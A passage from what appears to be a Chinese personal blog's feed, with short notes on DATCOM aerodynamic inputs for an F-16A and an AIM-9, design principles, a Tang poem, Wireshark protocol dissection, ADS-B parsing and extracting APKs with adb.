SSPN&#x3D;14.79, </span><br><span class="line">         SAVSI&#x3D;45.0,</span><br><span class="line">         CHSTAT&#x3D;0.0, TWISTA&#x3D;0.0, </span><br><span class="line">         DHDADI&#x3D;-1.5,</span><br><span class="line">         TYPE&#x3D;1.0$ </span><br><span class="line"></span><br><span class="line">NACA-F-4-0012</span><br><span class="line"> $SYMFLP FTYPE&#x3D;2.0,    NDELTA&#x3D;9.0,</span><br><span class="line">         DELTA(1)&#x3D;0.0,5.0,10.0,15.0,20.0,25.0,30.0,35.0,40.0,</span><br><span class="line">         PHETE&#x3D;0.0522, PHETEP&#x3D;0.0391,</span><br><span class="line">         CHRDFI&#x3D;2.40,   CHRDFO&#x3D;1.30,</span><br><span class="line">         SPANFI&#x3D;3.50,  SPANFO&#x3D;12.00,</span><br><span class="line">         NTYPE&#x3D;1.0$</span><br><span class="line">CASEID FLAPS: ----- General Dynamics F-16A Block 15(+) -----</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE </span><br><span class="line"></span><br><span class="line"> $ASYFLP STYPE&#x3D;4.0, NDELTA&#x3D;9.0,</span><br><span class="line">         DELTAL(1)&#x3D;-32.0,-20.0,-10.0,-5.0, 0.0, 5.0, 10.0, 20.0, 32.0,</span><br><span class="line">         DELTAR(1)&#x3D; 32.0, 20.0, 10.0, 5.0, 0.0,-5.0,-10.0,-20.0,-32.0,</span><br><span class="line">         SPANFI&#x3D;12.05, SPANFO&#x3D;14.79,</span><br><span class="line">         PHETE&#x3D;0.05228,</span><br><span class="line">         CHRDFI&#x3D;1.35, CHRDFO&#x3D;0.74$</span><br><span class="line">CASEID AILERONS: ----- General Dynamics F-16A Block 15(+) -----</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE</span><br><span class="line"></span><br><span class="line">NACA-H-4-0010</span><br><span class="line"> $HTPLNF CHRDR&#x3D;9.91, CHRDTP&#x3D;2.62,</span><br><span class="line">         SSPNE&#x3D;5.77,  SSPN&#x3D;9.25,</span><br><span class="line">         SAVSI&#x3D;40.0, </span><br><span class="line">         CHSTAT&#x3D;0.0,</span><br><span class="line">         DHDADI&#x3D;-15.0,</span><br><span class="line">         TYPE&#x3D;1.0$</span><br><span class="line"> $SYMFLP FTYPE&#x3D;5.0,    NDELTA&#x3D;9.0,</span><br><span class="line">         DELTA(1)&#x3D;-32.0,-20.0,-10.0,-5.0, 0.0, 5.0, 10.0, 20.0, 32.0,</span><br><span class="line">         PHETE&#x3D;0.0522, PHETEP&#x3D;0.0391,</span><br><span class="line">         CHRDFI&#x3D;7.42, CHRDFO&#x3D;2.62,</span><br><span class="line">         SPANFI&#x3D;3.65, SPANFO&#x3D;9.25,</span><br><span class="line">         NTYPE&#x3D;1.0$</span><br><span class="line"></span><br><span class="line">NACA-V-4-0012</span><br><span class="line"> $VTPLNF CHRDR&#x3D;9.64,  CHRDTP&#x3D;3.80,</span><br><span class="line">         SSPNE&#x3D;8.59,  SSPN&#x3D;10.53,</span><br><span class="line">         SAVSI&#x3D;45.0,  </span><br><span class="line">         CHSTAT&#x3D;0.0,</span><br><span class="line">         TYPE&#x3D;1.0$ </span><br><span class="line"> </span><br><span class="line">SAVE</span><br><span class="line">CASEID TOTAL: ----- General Dynamics F-16A Block 15(+) -----</span><br></pre></td></tr></table></figure>

<h1 id="AIM-9输入示例"><a href="#AIM-9输入示例" class="headerlink" title="AIM-9输入示例"></a>AIM-9输入示例</h1><p>在Missile Datcom的for005.dat文件中输入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$FLTCON </span><br><span class="line"> NALPHA&#x3D;5.00000,</span><br><span class="line"> ALPHA&#x3D;-8.0000,-4.0000,0.0000,4.0000,8.0000,</span><br><span class="line"> NMACH&#x3D;4.00000,</span><br><span class="line"> MACH&#x3D;0.5000,1.5000,2.5000,3.5000,</span><br><span class="line"> ALT&#x3D;5000.0000,$</span><br><span class="line">$REFQ </span><br><span class="line"> XCG&#x3D;1.5000,$</span><br><span class="line">$AXIBOD </span><br><span class="line"> TNOSE&#x3D;CONICAL,</span><br><span class="line"> LNOSE&#x3D;0.28000,</span><br><span class="line"> DNOSE&#x3D;0.13000,</span><br><span class="line"> LCENTR&#x3D;2.69000,</span><br><span class="line"> DCENTR&#x3D;0.13000,$</span><br><span class="line">$FINSET1 </span><br><span class="line"> SECTYP&#x3D;NACA,</span><br><span class="line"> SSPAN&#x3D;0.0650,0.2900,</span><br><span class="line"> CHORD&#x3D;0.3000,0.0000,</span><br><span class="line"> CFOC&#x3D;0.2000,0.0000,</span><br><span class="line"> XLE&#x3D;0.2800,0.5700,</span><br><span class="line"> NPANEL&#x3D;4.00000,</span><br><span class="line"> PHIF&#x3D;45.0000,135.0000,225.0000,315.0000,$</span><br><span class="line">$FINSET2 </span><br><span class="line"> SECTYP&#x3D;NACA,</span><br><span class="line"> SSPAN&#x3D;0.0650,0.2900,</span><br><span class="line"> CHORD&#x3D;0.6600,0.4600,</span><br><span class="line"> XLE&#x3D;2.2200,2.8800,</span><br><span class="line"> NPANEL&#x3D;4.00000,</span><br><span class="line"> PHIF&#x3D;45.0000,135.0000,225.0000,315.0000,$</span><br><span class="line"> NACA-1-6-64-005</span><br><span class="line"> NACA-2-4-2204-04 </span><br><span class="line">DAMP </span><br><span class="line">PART </span><br><span class="line">PLOT </span><br><span class="line">PRESSURES </span><br><span class="line">SAVE</span><br><span class="line">DIM M</span><br><span class="line">DERIV DEG</span><br><span class="line">CASEID AIM-9</span><br><span class="line">NEXT CASE</span><br><span class="line">CASEID PANEL DEFLECTION</span><br><span class="line"> $DEFLCT DELTA1&#x3D;-5.0,5.0,5.0,-5.0$</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE</span><br><span class="line"> $DEFLCT DELTA1&#x3D;5.0,-5.0,-5.0,5.0$</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE</span><br><span class="line"> $DEFLCT DELTA1&#x3D;-10.0,10.0,10.0,-10.0$</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE</span><br><span class="line"> $DEFLCT DELTA1&#x3D;10.0,-10.0,-10.0,10.0$</span><br><span class="line">SAVE</span><br><span class="line">NEXT CASE</span><br></pre></td></tr></table></figure>

<h1 id="Matlab导入Datcom输出文件"><a href="#Matlab导入Datcom输出文件" class="headerlink" title="Matlab导入Datcom输出文件"></a>Matlab导入Datcom输出文件</h1><p>Matlab使用datcomimport函数导入Datcom输出文件数据到工作空间，有可能会出现如下所示警告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; In usafdatcom</span><br><span class="line">  In usafdatcom</span><br><span class="line">  In datcomimport (line 88) </span><br><span class="line">警告: DATCOM file reader state inconsistent</span><br></pre></td></tr></table></figure>
<p>然后会发现导入的启动系数值无法使用。出现该问题的原因主要有：</p>
<ul>
<li>计算多迎角多高度飞机气动系数时，应设置LOOP为2.0，而非默认的1.0。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://wenku.baidu.com/view/4bc2f49667ec102de3bd8947.html" target="_blank" rel="noopener">Missile Datcom</a>,by beihang.</li>
<li><a href="http://www.holycows.net/datcom/index.html" target="_blank" rel="noopener">Datcom</a>,by holycows.</li>
<li><a href="https://wenku.baidu.com/view/ea3c834cfad6195f302ba61e.html" target="_blank" rel="noopener">DATCOM使用介绍</a>,by wenku.</li>
<li><a href="https://en.wikipedia.org/wiki/United_States_Air_Force_Stability_and_Control_Digital_DATCOM" target="_blank" rel="noopener">United States Air Force Stability and Control Digital DATCOM</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/Missile_Datcom" target="_blank" rel="noopener">Missile Datcom</a>,by wikipedia.</li>
<li><a href="https://wenku.baidu.com/view/ad7ef34133687e21af45a932.html" target="_blank" rel="noopener">操稳特性快速评估及其在飞机设计中的应用</a>,by 张帅.</li>
<li><a href="https://wenku.baidu.com/view/d228fa0dca50ad02de80d4d8d15abe23482f0380.html" target="_blank" rel="noopener">MISSILE DATCOM使用教程_LIppt课件</a>,by 雅芳.</li>
<li><a href="https://wenku.baidu.com/view/768a1060001ca300a6c30c22590102020740f291.html?fr=search" target="_blank" rel="noopener">datcom 计算导弹气动参数</a>,by 一路向北884.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title>非专业设计师的基本设计原则</title>
    <url>/2019/06/14/%E9%9D%9E%E4%B8%93%E4%B8%9A%E8%AE%BE%E8%AE%A1%E5%B8%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>绝大部分内容创作者不是专业的设计师，因此在其内容展示时会遇到很大的困难，即如何对展示的内容进行优雅的排版？</p>
<p>遵循如下<strong>四个原则</strong>，虽然不会让您创造出令人惊艳的设计，但能帮助您创建出色、清晰且易于理解的设计，使每个人都可以轻松理解和互动。</p>
<h1 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h1><p><strong>确保所有元素之间有足够的对比度。您的设计元素应该完全相同或显着不同。</strong></p>
<p>对比问题主要表现在4种不同的方面：</p>
<ul>
<li>颜色：浅色使用深色，反之亦然。</li>
</ul>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*1c9lIQ_y0Cz82vs4uF05ZA.png" width="80%"/>
</p>


<ul>
<li>尺寸：仅将彼此相邻的元素放在完全相同的大小或相当大的大小上。</li>
</ul>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*Vy_CjoiJ4s3_U3jNW9JZlA.png" width="80%"/>
</p>

<ul>
<li>重量：与尺寸相同，只是将元素放在彼此相邻的重量完全相同或重量相当不同的地方。</li>
</ul>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*WibV_UOHFJxjD1EUbs2sxQ.png" width="80%"/>
</p>

<ul>
<li>样式：不要将一个斜体类型放在另一个斜体类型旁边，或者在另一个衬线字体旁边放置一个衬线字体。 结合不同的东西。</li>
</ul>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*kYKhe2rzZkyB8Oi84a6euQ.png" width="80%"/>
</p>

<h1 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h1><p>确保类似的元素以类似的方式出现。</p>
<p>为什么？ 首先，通过保持事物的一致性（因此，简单），您可以让人们将注意力集中在设计的重要方面，而不是被一直在变化的事物分散注意力。</p>
<p>其次，一致性增加了信任，使事物看起来实际上是设计的，而不是简单地快速抛在一起。</p>
<p>一旦你选择它们就要坚持下去：</p>
<ul>
<li>字体/字体</li>
<li>调色板/颜色的阴影</li>
<li>表格</li>
<li>对齐</li>
<li>装饰元素的风格</li>
</ul>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*W843TWXVVLson0ME-6crWQ.png" width="80%"/>
</p>


<h1 id="奥卡姆剃刀"><a href="#奥卡姆剃刀" class="headerlink" title="奥卡姆剃刀"></a>奥卡姆剃刀</h1><p>奥卡姆剃刀即若无必要，勿增实体，以减少视觉噪音。</p>
<p>您在设计中使用的元素数量越少越好。</p>
<p>为什么？ 人类的大脑很难处理信息并在输入过载的情况下做出决策。 使用尽可能少的装饰元素（字体，颜色，阴影，框架，笔画，图标，图案等）。</p>
<p>将奥卡姆剃刀的设计原则应用于所有内容：</p>
<p>如果只用2个元素可以实现某些功能，请不要使用3.如果可以使用10个元素实现某些功能，请不要使用20.您可以使用它。</p>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*Bjh-mMQ5VQ99TvHPyCCmNQ.png" width="80%"/>
</p>

<h1 id="空间"><a href="#空间" class="headerlink" title="空间"></a>空间</h1><p>事物的定位方式会发送关于其含义的元级别消息。</p>
<p>为什么这很重要？ 因为了解你如何定位事物以及你在它们周围添加了多少空间有助于降低设计的复杂性，因此，使它更令人愉悦，更容易与之交互。</p>
<p>在设计中使用空间来传达这三个方面的意义：</p>
<ol>
<li>接近==相关性</li>
</ol>
<p>与其他元素相比彼此更接近的事物被认为彼此更多地相互关联而不是与其他元素相关。</p>
<p>这个是最重要的，因为我觉得它经常被忽视（甚至有些人声称是专业设计师，而不是命名任何名字）。</p>
<p>它可以以多种不同的方式应用，例如：</p>
<pre><code>* 行之间应该有一个空格，而不是一行中每个单词之间的空间 - 同样，不同段落之间的空间也比段落内的行之间的空间要大。</code></pre><p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*HQyTLidmveDLqN7su2evmg.png" width="80%"/>
</p>

<pre><code>* 设计元素应该在彼此之间具有较小的空间，而不是在这些元素和组合物的边缘之间。</code></pre><p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*Wb5mwX_UEIn0Wwsp7ObCNQ.png" width="80%"/>
</p>

<pre><code>* 标签和支持信息应位于其描述/相关的元素附近。</code></pre><p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*zNbzNX9H9GBkfNz2EO5qww.png" width="80%"/>
</p>


<ol start="2">
<li>负空间</li>
</ol>
<p>与奥卡姆剃刀设计原则结合使用，尽可能地为您的设计提供负面空间，使它们整齐并使其意义更加明显。</p>
<p>将太多元素放入有限的空间就像试着一次听三首不同的歌。 很难理解所说的内容。</p>
<p align="center">
    <img src="https://cdn-images-1.medium.com/max/800/1*mNNmcsVmOooLRgtF3CJw1g.png" width="80%"/>
</p>

<ol start="3">
<li>重要性和秩序</li>
</ol>
<p>最重要的事情，你先放，和/或让它们占用最多的空间。 使用一系列事物来传达秩序。 等等。你绝对可以弄明白其余的。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.freecodecamp.org/news/fundamental-design-principles-for-non-designers-ad34c30caa7/" target="_blank" rel="noopener">Fundamental design principles for non-designers</a>,by freecodecamp.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%A5%A5%E5%8D%A1%E5%A7%86%E5%89%83%E5%88%80" target="_blank" rel="noopener">奥卡姆剃刀</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>侠客行</title>
    <url>/2018/05/08/%E4%BE%A0%E5%AE%A2%E8%A1%8C/</url>
    <content><![CDATA[<center>
作者：李白
赵客缦胡缨，吴钩霜雪明。
银鞍照白马，飒沓如流星。
十步杀一人，千里不留行。
事了拂衣去，深藏身与名。
闲过信陵饮，脱剑膝前横。
将炙啖朱亥，持觞劝侯嬴。
三杯吐然诺，五岳倒为轻。
眼花耳热后，意气素霓生。
救赵挥金锤，邯郸先震惊。
千秋二壮士，烜赫大梁城。
纵死侠骨香，不惭世上英。
谁能书阁下，白首太玄经。
</center>]]></content>
      <tags>
        <tag>唐诗</tag>
        <tag>传统文化</tag>
      </tags>
  </entry>
  <entry>
    <title>飞行仿真中飞行器控制器的设计方法</title>
    <url>/2021/01/03/%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B8%AD%E9%A3%9E%E8%A1%8C%E5%99%A8%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>飞行仿真中飞行器控制器的设计方法可以参考Matlab中的示例。具体步骤如下：</p>
<ul>
<li>建立飞机动力学模型</li>
<li>配平和线性化</li>
<li>调参</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.mathworks.com/help/slcontrol/ug/HL20TrimLinearizeExample.html" target="_blank" rel="noopener">Trimming and Linearization of the HL-20 Airframe</a>,by mathworks.</li>
<li><a href="https://www.mathworks.com/help/control/ug/HL20RateControlExample.html" target="_blank" rel="noopener">Angular Rate Control in the HL-20 Autopilot</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js封装echarts的方法</title>
    <url>/2023/04/15/Vue-js%E5%B0%81%E8%A3%85echarts%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在Vuejs项目中封装echarts的主要目的是简化echart的使用难度，使之不再需要编写复杂的options，只需传递需要绘制的数据即可。</p>
<p>请参考<a href="https://juejin.cn/post/6995518429952212999" target="_blank" rel="noopener">vue项目中封装echarts的比较优雅的方式</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6995518429952212999" target="_blank" rel="noopener">vue项目中封装echarts的比较优雅的方式</a>,by liyoro.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>如何看待绩效考核</title>
    <url>/2023/06/06/%E5%A6%82%E4%BD%95%E7%9C%8B%E5%BE%85%E7%BB%A9%E6%95%88%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p>陈浩大神关于绩效考核的观点我很认同，可惜大神已仙逝，无缘一见。以下是他的主要观点：</p>
<blockquote>
<p>1）制定目标和绩效，目的不是用来考核人的，而用来改善提高组织和人员业绩和效率的。</p>
</blockquote>
<blockquote>
<p>2）人是复杂的，人是有状态波动的，任何时候都不应该轻易否定人，绩效考核应该考核的是事情，而不是人。</p>
</blockquote>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><p>OKR – Objectives, Key Result<br>KPI – Key Performance Indicator</p>
<h1 id="重要观点"><a href="#重要观点" class="headerlink" title="重要观点"></a>重要观点</h1><blockquote>
<p>绩效分应该打给项目，打给产品，打给部门，打给代码，而不是打给人。</p>
</blockquote>
<blockquote>
<p>OKR 三大特性：0）由员工提出，1）以目标为导向。2）全员共享。</p>
</blockquote>
<blockquote>
<p>KPI 最大的问题就是用 OKR 里的 Key Results 拿来当目标，从而导致员工只知道要做什么，不知道为什么，不知道为什么，不能理解目标，工作也就成了实实在在的应付！</p>
</blockquote>
<blockquote>
<p>KPI本身是一种被动的、后置的考察，在工作完成之后考察员工的行为是否符合标准。因此，员工对于公司的目标漠不关心，只关心自己的KPI，因为这才是自己的最大的利益，为了达到KPI，有的员工开始不思考，并使用一些简单粗暴的玩法，其实这样既害了公司，也害了自己。自己的成长和进步也因为强大的 KPI 而抛在了脑后。</p>
</blockquote>
<blockquote>
<p>当然，KPI 绩效考核一般来说，不一定会毁掉公司的，相反，对于喜欢使用蛮力的劳动密集型的公司来说，可能还有所帮助，然而，KPI毁掉的一定是团队的文化和团队的挑战精神，以及创新和对事业的热情，甚至会让其中的人失去应有的正常的判断力（分不清充分和必要条件，分不清很多事的因果关系）。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://coolshell.cn/articles/17972.html" target="_blank" rel="noopener">我看绩效考核</a>,by 陈浩.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark分析私有网络协议的方法</title>
    <url>/2023/06/06/Wireshark%E5%88%86%E6%9E%90%E7%A7%81%E6%9C%89%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h1><p>使用WireShark分析私有网络协议的难度很高，具体方法可以参考以下链接：</p>
<ul>
<li><a href="https://www.freebuf.com/articles/network/286936.html" target="_blank" rel="noopener">一次私有协议的流量分析</a></li>
<li><a href="https://blog.csdn.net/quality_C/article/details/125234463" target="_blank" rel="noopener">私有协议的解密游戏：从秘文到明文</a></li>
</ul>
<h2 id="WireShark使用方法"><a href="#WireShark使用方法" class="headerlink" title="WireShark使用方法"></a>WireShark使用方法</h2><p>请参考<a href="https://www.cnblogs.com/linyfeng/p/9496126.html" target="_blank" rel="noopener">wireshark抓包新手使用教程</a>。</p>
<h2 id="协议分析插件开发"><a href="#协议分析插件开发" class="headerlink" title="协议分析插件开发"></a>协议分析插件开发</h2><p>请参考以下链接：</p>
<ul>
<li><a href="https://www.jianshu.com/p/e0ed83516031" target="_blank" rel="noopener">Wireshark录取自定义报文的方法</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1696433" target="_blank" rel="noopener">实战编写 wireshark 插件解析私有协议</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/362748246" target="_blank" rel="noopener">Wireshark C 插件开发之插件框架</a></li>
<li><a href="https://www.cnblogs.com/little-kwy/p/14888454.html" target="_blank" rel="noopener">wireshark插件开发 - 自定义协议</a></li>
</ul>
<p>注意事项：</p>
<ul>
<li>一个端口只能绑定一个协议解析器，不管改端口下有多少中报文格式</li>
<li>解析树的TreeItem添加协议字段时，应使用TvbRange数据类型，否则对应hex数据无法高亮显示，示例如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local t &#x3D; tree:add( proto_foo, buf() )</span><br><span class="line">t:add_le( proto_foo.fields.bytes, buf(0,4) )</span><br><span class="line"># 实现日期字段的显示</span><br><span class="line">t:add_le( proto_foo.fields.string, buf(0,8), datetime)</span><br></pre></td></tr></table></figure>

<h2 id="数据包回放"><a href="#数据包回放" class="headerlink" title="数据包回放"></a>数据包回放</h2><p>wireshark以pcap格式保存抓取的流量。pcap的具体格式请参考<a href="https://blog.csdn.net/Hollake/article/details/90108950" target="_blank" rel="noopener">Wireshark文件pcap的格式详细解析有实例（Global Header、Packet Header）</a></p>
<p>可使用tcpreplay、scap、xcap、netassisnt等工具回放pcap文件。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/linyfeng/p/9496126.html" target="_blank" rel="noopener">wireshark抓包新手使用教程</a>,by Beng Dou.</li>
<li><a href="https://www.freebuf.com/articles/network/286936.html" target="_blank" rel="noopener">一次私有协议的流量分析</a>,by 聚铭网络.</li>
<li><a href="https://blog.csdn.net/quality_C/article/details/125234463" target="_blank" rel="noopener">私有协议的解密游戏：从秘文到明文</a>,by Smoke0901.</li>
<li><a href="https://blog.csdn.net/Hollake/article/details/90108950" target="_blank" rel="noopener">Wireshark文件pcap的格式详细解析有实例（Global Header、Packet Header）</a>,by Hollake.</li>
<li><a href="https://cloud.tencent.com/developer/article/1696433" target="_blank" rel="noopener">实战编写 wireshark 插件解析私有协议</a>,by 信安之路.</li>
<li><a href="https://zhuanlan.zhihu.com/p/362748246" target="_blank" rel="noopener">Wireshark C 插件开发之插件框架</a>,by 大川搬砖.</li>
<li><a href="https://blog.csdn.net/lanyou1900/article/details/45008035" target="_blank" rel="noopener">Tcpreplay安装和使用</a>,by lanyou1900.</li>
<li><a href="https://blog.csdn.net/makenothing/article/details/105277614" target="_blank" rel="noopener">tcpreplay 快速入门使用</a>,by CAPTIAN船长.</li>
<li><a href="https://blog.csdn.net/zhuxian2009/article/details/120841057" target="_blank" rel="noopener">pcap回放——tcpreplay</a>,by zhuxian2009.</li>
<li><a href="https://zh.wikipedia.org/wiki/Pcap" target="_blank" rel="noopener">Pcap</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/midhillzhou/p/14451711.html" target="_blank" rel="noopener">两款造包工具，科来和xcap</a>,by 周中山.</li>
<li><a href="https://jingyan.baidu.com/article/647f01158e6cda3e2048a848.html" target="_blank" rel="noopener">报文回放工具：xcap的使用方法</a>,by 荭知.</li>
<li><a href="https://www.cnblogs.com/little-kwy/p/14888454.html" target="_blank" rel="noopener">wireshark插件开发 - 自定义协议</a>,by m0w3n.</li>
<li><a href="https://www.jianshu.com/p/e0ed83516031" target="_blank" rel="noopener">Wireshark录取自定义报文的方法</a>,by 卓_然.</li>
<li><a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Tree.html" target="_blank" rel="noopener">Adding Information To The Dissection Tree</a>,by wireshark.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ADS-B数据解析方法</title>
    <url>/2023/06/09/ADS-B%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>广播式自动相关监视（英语：Automatic dependent surveillance – broadcast，缩写ADS–B）是一种飞机监视技术，飞机通过卫星导航系统确定其位置，并进行定期广播，使其可被追踪。空中交通管制地面站可以接收这些信息并作为二次雷达的一个替代品，从而不需要从地面发送问询信号。其他飞机也可接收这些信息以提供姿态感知和进行自主规避。</p>
<h1 id="ADS-B地面接收设备系统结构"><a href="#ADS-B地面接收设备系统结构" class="headerlink" title="ADS-B地面接收设备系统结构"></a>ADS-B地面接收设备系统结构</h1><p>请参考<a href="http://m.chinaaet.com/article/3000090657" target="_blank" rel="noopener">ADS-B数据报文采集与解析系统的设计与实现</a>。</p>
<h1 id="ADS-B数据解析"><a href="#ADS-B数据解析" class="headerlink" title="ADS-B数据解析"></a>ADS-B数据解析</h1><p>请参考以下链接：</p>
<ul>
<li><a href="https://m.fx361.com/news/2020/1223/7376094.html" target="_blank" rel="noopener">ADS-B数据格式解析</a></li>
<li><a href="https://liujiahua.com/blog/2019/08/19/csharp-Cat021026/" target="_blank" rel="noopener">Cat021 报文解析</a></li>
<li><a href="https://github.com/CroatiaControlLtd/asterix" target="_blank" rel="noopener">asterix</a></li>
<li><a href="https://github.com/hpuhr/jASTERIX" target="_blank" rel="noopener">jASTERIX</a></li>
<li><a href="https://www.eurocontrol.int/sites/default/files/content/documents/nm/asterix/20150615-asterix-adsbtr-cat021-part12-v2.4.pdf" target="_blank" rel="noopener">EUROCONTROL Specification for Surveillance Data Exchange ASTERIX</a></li>
</ul>
<h1 id="Virtual-Radar-Server"><a href="#Virtual-Radar-Server" class="headerlink" title="Virtual Radar Server"></a>Virtual Radar Server</h1><p>Virtual Radar Server 是一个运行本地 Web 服务器的开源 .NET 应用程序。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://m.fx361.com/news/2020/1223/7376094.html" target="_blank" rel="noopener">ADS-B数据格式解析</a>,by 陈晓伟.</li>
<li><a href="https://liujiahua.com/blog/2019/08/19/csharp-Cat021026/" target="_blank" rel="noopener">Cat021 报文解析</a>,by 刘佳华.</li>
<li><a href="https://blog.csdn.net/weixin_45295221/article/details/100636924" target="_blank" rel="noopener">接口和解析软件——ADS-B数据解析软件</a>,by 北京通航电科.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%B9%BF%E6%92%AD%E5%BC%8F%E8%87%AA%E5%8A%A8%E7%9B%B8%E5%85%B3%E7%9B%91%E8%A7%86" target="_blank" rel="noopener">广播式自动相关监视</a>,by wikipedia.</li>
<li><a href="http://m.chinaaet.com/article/3000090657" target="_blank" rel="noopener">ADS-B数据报文采集与解析系统的设计与实现</a>,by 索国伟，王金锁，郭荣华，赵 盼.</li>
<li><a href="https://github.com/CroatiaControlLtd/asterix" target="_blank" rel="noopener">asterix</a>,by CroatiaControlLtd.</li>
<li><a href="https://github.com/hpuhr/jASTERIX" target="_blank" rel="noopener">jASTERIX</a>,by hpuhr</li>
<li><a href="https://www.eurocontrol.int/sites/default/files/content/documents/nm/asterix/20150615-asterix-adsbtr-cat021-part12-v2.4.pdf" target="_blank" rel="noopener">EUROCONTROL Specification for Surveillance Data Exchange ASTERIX</a>,by eurocontrol.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>提取安卓已安装应用APK文件的方法</title>
    <url>/2023/06/15/%E6%8F%90%E5%8F%96%E5%AE%89%E5%8D%93%E5%B7%B2%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8APK%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>需要从安卓系统中已安装的APP中提取出APP的安装包，因此研究了以下。</p>
<h1 id="安装adb"><a href="#安装adb" class="headerlink" title="安装adb"></a>安装adb</h1><h2 id="下载adb："><a href="#下载adb：" class="headerlink" title="下载adb："></a>下载adb：</h2><p><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip" target="_blank" rel="noopener">https://dl.google.com/android/repository/platform-tools-latest-windows.zip</a></p>
<h2 id="配置环境变量PATH"><a href="#配置环境变量PATH" class="headerlink" title="配置环境变量PATH"></a>配置环境变量PATH</h2><h1 id="提取Apk"><a href="#提取Apk" class="headerlink" title="提取Apk"></a>提取Apk</h1><p>提取Apk的步骤如下：</p>
<ul>
<li>用usb数据线连接手机和电脑，启用手机开发模式，设置usb调试模式</li>
<li>在cmd窗口中输入命令adb devices，查看手机和电脑是否连接成功</li>
<li>执行 adb  shell  pm  list  packages 命令，查看需要提取的APP</li>
<li>执行 adb  shell  pm  path  package_name 命令，获取APP安装路径</li>
<li>执行 adb  pull  安装包路径  输出路径 命令，生成APP的apk安装文件</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/x2584179909/article/details/108319973" target="_blank" rel="noopener">windows下载安装adb（极其简单）</a>,by x2584179909.</li>
